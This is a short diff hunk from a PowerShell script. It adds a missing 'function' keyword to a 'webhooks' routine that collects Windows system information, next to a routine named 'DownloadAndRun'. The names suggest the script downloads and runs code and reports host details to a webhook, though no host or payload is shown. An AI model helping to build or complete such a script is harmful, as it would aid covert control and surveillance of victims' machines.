@@ -303,7 +303,7 @@ function DownloadAndRun {
     } while ($true)
 }
 
-webhooks {
+function webhooks {
     # get system info
     $os = Get-CimInstance -ClassName Win32_OperatingSystem
     $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
